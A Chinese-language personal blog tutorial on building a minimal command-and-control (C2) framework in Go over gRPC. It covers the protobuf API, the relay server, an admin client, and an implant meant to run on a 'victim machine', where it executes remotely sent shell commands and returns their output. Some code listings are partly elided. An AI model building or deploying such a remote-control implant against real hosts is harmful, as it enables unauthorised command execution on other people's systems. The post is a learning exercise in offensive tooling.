@@ -1,0 +1,309 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" id="meta-theme-color" content="#faf6e9">
+  
+  <title>learn_to_write_a_C2_by_Go · Yliken</title>
+  <meta name="description" content="红豆藏于南枝深处，红豆藏于南枝深处，相思缠绕心头不息，纵使山河阻隔千里，愿化清风伴君身侧">
+  <script>
+    /* 首帧前即定稿纸色：优先手动选择，否则跟随系统亮暗，避免闪烁 */
+    (function () {
+      var theme = 'day';
+      try {
+        var saved = localStorage.getItem('page-one-paper-theme');
+        if (saved === 'day' || saved === 'night') theme = saved;
+        else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) theme = 'night';
+      } catch (e) { /* ignore */ }
+      document.documentElement.dataset.theme = theme;
+    })();
+  </script>
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <header class="site-header">
+    <div class="container site-header__inner">
+      <a class="brand" href="/" aria-label="回到首页">
+        <span class="brand__mark" aria-hidden="true">页</span>
+        <span class="brand__name">Yliken</span>
+      </a>
+      <nav class="site-nav" aria-label="站点导航">
+        
+          <a class="site-nav__link" href="/">首页</a>
+        
+          <a class="site-nav__link" href="/archives/">归档</a>
+        
+          <a class="site-nav__link" href="/moments/">朋友圈</a>
+        
+          <a class="site-nav__link" href="/memories/">回忆</a>
+        
+          <a class="site-nav__link" href="/reading/">阅读</a>
+        
+          <a class="site-nav__link" href="/yearly-reviews/">年度总结</a>
+        
+          <a class="site-nav__link" href="/link/">友链</a>
+        
+          <a class="site-nav__link" href="/about/">关于</a>
+        
+      </nav>
+      
+      
+        <button class="theme-toggle" type="button" aria-label="切换到夜晚模式" title="切换到夜晚">
+          <span class="theme-toggle__icon" aria-hidden="true">☾</span>
+        </button>
+      
+    </div>
+  </header>
+
+  
+
+  <main class="site-main">
+    <div class="container">
+      
+<article class="post">
+  <header class="post__header">
+    
+      <p class="post__meta">
+        
+          <time class="post__date" datetime="2025-04-05">2025年4月5日</time>
+        
+        
+          <span class="post__readtime">14 分钟</span>
+        
+        
+          <span class="post__tags" aria-label="标签">
+            <a class="tag" href="/tags/C2/">#C2</a>
+          </span>
+        
+      </p>
+    
+    <h1 class="post__title">learn_to_write_a_C2_by_Go</h1>
+  </header>
+
+  <div class="post-body markdown-body">
+    <blockquote>
+<p>近况:</p>
+<p>清明假期第二天、还有些昨天哪些负面情绪😢。很难受，也很累</p>
+<p>昨天发现自己在写东西的时候，可以让自己的暂时忽略掉这种负面情绪。</p>
+<p>前几天chromos2me分享了一个新的C2框架，然后就想到了去年年底给chromos2me说过的要写一个极其简单的C2来着。 一直没写来着，今天趁机写了顺便放松一下自己吧。。。。。 😁</p>
+</blockquote>
+<h2 id="🔍什么是C2？"><a href="#🔍什么是C2？" class="headerlink" title="🔍什么是C2？"></a>🔍什么是C2？</h2><p><strong>C2</strong>即<strong>Command and Control</strong> </p>
+<p>C2服务器的概念基于命令和控制模型。攻击者扮演指挥官的角色，而受感染的设备则充当实现攻击者恶意命令的棋子</p>
+<p>C2服务器充当攻击者和受感染设备之间通信的桥梁。出金各方之间的双向通信以及数据的传输</p>
+<h4 id="远控木马RAT"><a href="#远控木马RAT" class="headerlink" title="远控木马RAT"></a>远控木马RAT</h4><p>RAT(Remote Access Trojan)是攻击者用来在受感染的计算机上远程执行操作的工具。</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504052242197.png" alt="image-20250405224213657"></p>
+<h2 id="🔍什么是RPC？"><a href="#🔍什么是RPC？" class="headerlink" title="🔍什么是RPC？"></a>🔍什么是RPC？</h2><p><strong>RPC(Remote Procedure Call) 远程过程调用:</strong></p>
+<p> 它是一种计算机通信协议。 允许程序在一个计算机上面调用另一个函数</p>
+<p>从<em><strong>本地函数调用</strong></em>来说，我们在程序中调用一个函数。比如: <code>add(2,3)</code>，程序会跳转到<code>add()</code>函数的定义去执行，然后返回结果。这个过程发生在我们自己的计算机上，也是你的程序内部</p>
+<p>而<em><strong>远程过程调用</strong></em>则是我们像平时那样调用函数一样去调用它。它会自动将请求发送给远程服务器。执行之后返回结果。 这个观察没有发生在我们自己的计算机上面。</p>
+<h3 id="🔍什么是gRPC"><a href="#🔍什么是gRPC" class="headerlink" title="🔍什么是gRPC"></a>🔍什么是gRPC</h3><p><strong>gRPC</strong>是<strong>Google</strong>开发的一个现代化的RPC框架。是一个</p>
+<blockquote>
+<p>:white_check_mark: “一个更快、更强、更智能的RPC工具“。 😊</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>特性</th>
+<th>gRPC</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>🔄 通信协议</td>
+<td>用的是 <strong>HTTP&#x2F;2</strong></td>
+</tr>
+<tr>
+<td>📦 数据格式</td>
+<td>用的是 <strong>Protocol Buffers（protobuf）</strong></td>
+</tr>
+<tr>
+<td>🧠 多语言支持</td>
+<td>支持 Python、Go、Java、C++ 等十几种语言</td>
+</tr>
+<tr>
+<td>🚰 支持流式通信</td>
+<td>不只是请求-响应，还可以实时双向传输数据</td>
+</tr>
+<tr>
+<td>🛡 安全 &amp; 验证</td>
+<td>内建支持 TLS，加密传输</td>
+</tr>
+</tbody></table>
+<h2 id="🎯代码"><a href="#🎯代码" class="headerlink" title="🎯代码"></a>🎯代码</h2><p><strong>项目结构</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C2_by_Yliken_in_20250405</span><br><span class="line">    ├── client</span><br><span class="line">    │   └── client.go</span><br><span class="line">    ├── grpcapi</span><br><span class="line">    │   └── implant.proto</span><br><span class="line">    ├── implant</span><br><span class="line">    │   └── implant.go</span><br><span class="line">    ├── main.go</span><br><span class="line">    ├── server</span><br><span class="line">    │   └── server.go</span><br><span class="line">    ├── go.mod</span><br><span class="line">    └── go.sum</span><br></pre></td></tr></table></figure>
+
+<h3 id="📌定义和构建gRPC-API"><a href="#📌定义和构建gRPC-API" class="headerlink" title="📌定义和构建gRPC API"></a>📌定义和构建gRPC API</h3><center>使用Protobuf 定义 gRPC API</center>
+
+<p>代码</p>
+<figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;   <span class="comment">//指定使用Protocol Buffers的版本3语法</span></span><br><span class="line"><span class="keyword">package</span> grpcapi;    <span class="comment">//定义proto文件的包名 gprcapi</span></span><br><span class="line"><span class="keyword">option</span> go_package = <span class="string">&quot;./&quot;</span>;   <span class="comment">//指定生成的Go语言代码的包路径</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Implant 服务定义</span></span><br><span class="line"><span class="keyword">service </span><span class="title class_">Implant</span> &#123;</span><br><span class="line">  <span class="function"><span class="keyword">rpc</span> FetchCommand(Empty) <span class="keyword">returns</span> (Command)</span>; <span class="comment">// 定义一个远程过程调用(RPC) 方法 FetchCommand</span></span><br><span class="line">  <span class="function"><span class="keyword">rpc</span> SendOutput (Command) <span class="keyword">returns</span> (Empty)</span>;  <span class="comment">// 定义一个远程过程调用(RPC) 方法 SendOutput</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Admin 服务定义</span></span><br><span class="line"><span class="keyword">service </span><span class="title class_">Admin</span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">rpc</span> RunCommand (Command) <span class="keyword">returns</span>(Command)</span>;<span class="comment">// 定义一个远程过程调用(RPC) 方法 RunCommand</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个消息类型 Command</span></span><br><span class="line"><span class="keyword">message </span><span class="title class_">Command</span>&#123;</span><br><span class="line">  <span class="type">string</span>  In = <span class="number">1</span>;  <span class="comment">//定义字段 In 类型为string,表示命令输入的内容.   =1 是字段的唯一编号,用于序列化时标识字段</span></span><br><span class="line">  <span class="type">string</span>  Out = <span class="number">2</span>; <span class="comment">//定义字段 In 类型为string,表示命令输出的结果.   =2 是该字段的唯一编号</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义消息类型 Empty</span></span><br><span class="line"><span class="keyword">message </span><span class="title class_">Empty</span>&#123; <span class="comment">// 空类型 没有定义任何字段。 因此实例化后为空</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>message</code>名称以及他的字段名称可以随便取、Protobuf不强制要求具体名称。但是<code>message</code>的的每一个字段必须分配一个唯一的数字。这些数字用于在序列化后的二进制数据中标识字段。而不是<strong>字段的值</strong> 同时这也是下面这个问题的答案</li>
+</ul>
+<blockquote>
+<p>为什么字段 <code>In</code> 和<code>Out</code>的数据类型是字符串，后面缺跟着数字？</p>
+<p>答：</p>
+<ul>
+<li>这些数字不是子弹的值，而是字段的编号。Protobuf使用这些编号来区分消息中的字段。而不是直接使用字段名来区分</li>
+<li>这些代码只是<code>.proto</code>文件的一个模式定义，只描述数据结构，不涉及具体实现或者赋值。实际赋值是在代码中完成的。</li>
+</ul>
+</blockquote>
+<ul>
+<li><code>Empty</code>这个消息中不包含任何字段。可以将其理解为<code>null</code>，即为空.</li>
+</ul>
+<blockquote>
+<p>为什么要这样定义一个message类型呢？</p>
+<p>答：</p>
+<ul>
+<li>事实上，Protobuf不支持直接传递<code>null</code>或者空值给RPC方法(比如 :  <code>rpc SomeMethod(Null) returns (Null)</code>。这种写法是错误的)</li>
+<li>因此定义一个空message类型来绕过这种限制</li>
+</ul>
+</blockquote>
+<p>在编写好<code>.proto</code>文件之后，使用<code>protoc -I . --go_out=. --go-grpc_out=. implant.proto</code>将<code>.proto</code>文件转换为Go语言代码</p>
+<ul>
+<li><code>protoc</code><ul>
+<li>这是<code>Protocol Buffers</code>编译器的可执行文件。它负责读取<code>.proto</code>文件并生成目标语言代码。</li>
+</ul>
+</li>
+<li><code>-I  .</code><ul>
+<li><code>-I</code>是<code>--proto_path</code>的缩写，表示指定<code>.proto</code>文件的搜索路径。这里执行搜索路径是<code>.</code></li>
+<li><code>.</code>表示当前目录</li>
+</ul>
+</li>
+<li><code>--go_out=./</code><ul>
+<li><code>--go_out</code>是一个标志，告诉<code>protoc</code>生Go语言代码,并指定输出目录</li>
+<li><code>./</code>表示将生成的代码输出到当前目录</li>
+<li>这个选项需要<code>protoc-gen-go</code>插件的支持。</li>
+</ul>
+</li>
+<li><code>--go-grpc_out=.</code><ul>
+<li><code>--go-grpc_out</code>参数用于指定生成的gRPC代码的输出目录。</li>
+<li><code>.</code>同样表示当前目录</li>
+<li>这个参数会为 <code>.proto</code> 文件中的服务定义生成 gRPC 相关的代码，比如服务的客户端和服务器端的接口。</li>
+</ul>
+</li>
+<li><code>implant.proto</code><ul>
+<li>这个是输入文件，也就是要编译的<code>.proto</code>文件</li>
+</ul>
+</li>
+</ul>
+<p>命令执行以后会生成一个<code>implant.pb.go</code>与<code>implant_grpc.pb.go</code>文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grpcapi/</span><br><span class="line">├── implant_grpc.pb.go</span><br><span class="line">├── implant.pb.go</span><br><span class="line">└── implant.proto</span><br></pre></td></tr></table></figure>
+
+<h3 id="📌创建服务器"><a href="#📌创建服务器" class="headerlink" title="📌创建服务器"></a>📌创建服务器</h3><center>编写server.go</center>
+
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;C2_by_Yliken_in_20250405/grpcapi&quot;</span></span><br><span class="line">	<span class="string">&quot;context&quot;</span></span><br><span class="line">	<span class="string">&quot;errors&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;google.golang.org/grpc&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;net&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> implantServer <span class="keyword">struct</span> &#123;</span><br><span class="line">	grpcapi.UnimplementedImplantServer <span class="comment">// 嵌入未实现结构体</span></span><br><span class="line">	work, output                       <span class="keyword">chan</span> *grpcapi.Command</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> adminServer <span class="keyword">struct</span> &#123;</span><br><span class="line">	grpcapi.UnimplementedAdminServer <span class="comment">// 嵌入未实现结构体</span></span><br><span class="line">	work, output                     <span class="keyword">chan</span> *grpcapi.Command</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// implantServer的构造函数, 初始化并返回一个新的 implantServer示例</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewImplantServer</span><span class="params">(work, output <span class="keyword">chan</span> *grpcapi.Command)</span></span> *implantServer &#123;</span><br><span class="line">	s := <span class="built_in">new</span>(implantServer)</span><br><span class="line">	s.work = work</span><br><span class="line">	s.output = output</span><br><span class="line">	<span class="keyword">return</span> s</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// adminServer 的构造函数, 类似 implantServer</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewAdminServer</span><span class="params">(work, output <span class="keyword">chan</span> *grpcapi.Command)</span></span> *adminServer &#123;</span><br><span class="line">	s := <span class="built_in">new</span>(adminServer)</span><br><span class="line">	s.work = work</span><br><span class="line">	s.output = output</span><br><span class="line">	<span class="keyword">return</span> s</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*********************</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将命令发送到output通道返回空响应</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *implantServer)</span></span> SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, <span class="type">error</span>) &#123;</span><br><span class="line">	s.output &lt;- result</span><br><span class="line">	<span class="keyword">return</span> &amp;grpcapi.Empty&#123;&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *adminServer)</span></span> RunCommand(ctx context.Context, cmd *grpcapi.Command) (*grpcapi.Command, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> res *grpcapi.Command</span><br><span class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		s.work &lt;- cmd</span><br><span class="line">	&#125;()</span><br><span class="line">	res = &lt;-s.output</span><br><span class="line">	<span class="keyword">return</span> res, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">		声明变量</span></span><br><span class="line"><span class="comment">		* 两个网络监听器</span></span><br><span class="line"><span class="comment">		* 错误变量</span></span><br><span class="line"><span class="comment">		* gRPC服务器选项</span></span><br><span class="line"><span class="comment">		* 工作和输出管道</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">var</span> (</span><br><span class="line">		implanrListener, adminListener net.Listener</span><br><span class="line">		err                            <span class="type">error</span></span><br><span class="line">		opts                           []grpc.ServerOption</span><br><span class="line">		work, output                   <span class="keyword">chan</span> *grpcapi.Command</span><br><span class="line">	)</span><br><span class="line">	work, output = <span class="built_in">make</span>(<span class="keyword">chan</span> *grpcapi.Command), <span class="built_in">make</span>(<span class="keyword">chan</span> *grpcapi.Command)</span><br><span class="line"></span><br><span class="line">	******************************</span><br><span class="line">	grpcAdminServer.Serve(adminListener)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>写这个server.go的时候可能会出现一个无法导入<code>grpcapi</code>包中的方法的问题。</p>
+<ul>
+<li><p>这是因为<code>protoc</code>生成的<code>implant_grpc.pb.go</code>的<code>package</code>是<code>__</code></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504052149370.png" alt="image-20250405214946169"></p>
+<p>需要手动将其改成<code>package grpcapi</code></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504052150399.png" alt="image-20250405215016336"></p>
+</li>
+</ul>
+</li>
+<li><p><code>implantServer</code>用于从<code>work</code>通道中 非阻塞的获取命令。 </p>
+</li>
+<li><p><code>SendOutput</code>则将命令执行的结果发送到<code>output</code>通道。</p>
+</li>
+<li><p><code>RunCommand</code>将命令发送到work通道，然后在output通道中等待处理结果</p>
+</li>
+<li><p><code>main</code>方法主要功能</p>
+<ul>
+<li>初始化 gRPC 服务器和相应的 TCP 监听器</li>
+<li>注册处理命令的服务（<code>implantServer</code> 和 <code>adminServer</code>）</li>
+<li>启动服务器并开始接收和处理客户端请求，从而提供命令的获取和执行功能。</li>
+</ul>
+</li>
+</ul>
+<h3 id="📌客户端植入程序"><a href="#📌客户端植入程序" class="headerlink" title="📌客户端植入程序"></a>📌客户端植入程序</h3><center>编写implant.go</center>
+
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;C2_by_Yliken_in_20250405/grpcapi&quot;</span></span><br><span class="line">	<span class="string">&quot;context&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;google.golang.org/grpc&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;os/exec&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	*************************************************</span><br><span class="line">			c = exec.Command(tokens[<span class="number">0</span>], tokens[<span class="number">1</span>:]...)</span><br><span class="line">		&#125;</span><br><span class="line">		buf, err := c.CombinedOutput()</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			cmd.Out = err.Error()</span><br><span class="line">		&#125;</span><br><span class="line">		cmd.Out += <span class="type">string</span>(buf)</span><br><span class="line">		client.SendOutput(ctx, cmd) <span class="comment">//将命令执行结果发送回服务器</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这段代码实现了一个简单的<strong>植入客户端</strong>，它可以：</p>
+<ol>
+<li>持续与远程 C2 服务器保持连接；</li>
+<li>接收远程发送的命令；</li>
+<li>在本地执行命令；</li>
+<li>将输出结果发送回服务器。</li>
+</ol>
+<h3 id="📌构建管理组件"><a href="#📌构建管理组件" class="headerlink" title="📌构建管理组件"></a>📌构建管理组件</h3><center>编写client.go</center>
+
+<p>client.go也是管理客户端</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;C2_by_Yliken_in_20250405/grpcapi&quot;</span></span><br><span class="line">	<span class="string">&quot;context&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;google.golang.org/grpc&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> (</span><br><span class="line">		opts   []grpc.DialOption</span><br><span class="line">		conn   *grpc.ClientConn</span><br><span class="line">		err    <span class="type">error</span></span><br><span class="line">		client grpcapi.AdminClient</span><br><span class="line">	)</span><br><span class="line">	opts = <span class="built_in">append</span>(opts, grpc.WithInsecure())</span><br><span class="line">********************************</span><br><span class="line">		log.Fatal(err)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(cmd.Out)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为本文只是编写一个最简单的框架。这个client模块也写的很单一。client只能在运行的时候接收一次命令参数。不是交互形式</p>
+<h3 id="💻测试"><a href="#💻测试" class="headerlink" title="💻测试"></a>💻测试</h3><p>在您开始测试您的代码之前 请确保您的ip地址以及端口都配置正确</p>
+<p>运行<code>server.go</code>文件之后 ，在受害机器上面运行<code>implant.go</code>之后</p>
+<p>运行 <code>client.go</code>然后再传入想要执行的命令</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504052226553.png" alt="image-20250405222627421"></p>
+
+  </div>
+
+  
+    <nav class="post-toc" id="post-toc" aria-label="文章目录"></nav>
+  
+
+  
+    <footer class="post__license">
+      <span class="post__license-author">Yliken</span>
+      <span class="post__license-sep" aria-hidden="true">·</span>
+      <a class="post__license-link" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a>
+    </footer>
+  
+</article>
+
+
+
+
+  <nav class="post-nav" aria-label="相邻文章">
+    
+      <a class="post-nav__link post-nav__link--prev" href="/2025/04/20/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/">
+        <span class="post-nav__dir">← 上一篇</span>
+        <span class="post-nav__title">玄机</span>
+      </a>
+    
+    
+      <a class="post-nav__link post-nav__link--next" href="/2025/04/04/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-Principle/">
+        <span class="post-nav__dir">下一篇 →</span>
+        <span class="post-nav__title">hackmyvm-Principle</span>
+      </a>
+    
+  </nav>
+
+
+    </div>
+  </main>
+
+  
+
+  
+  <footer class="site-footer">
+    <div class="container site-footer__inner">
+      
+      <p class="site-footer__copy">
+        © 2026 Yliken
+      </p>
+      
+        <p class="site-footer__motto">在技术里较真，也在生活里留白。</p>
+      
+      
+        <p class="site-footer__powered">Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> · <span class="site-footer__theme">Page One</span></p>
+      
+    </div>
+    
+  </footer>
+  
+<script src="/js/theme.js"></script>
+
+  
+  
+</body>
+</html>
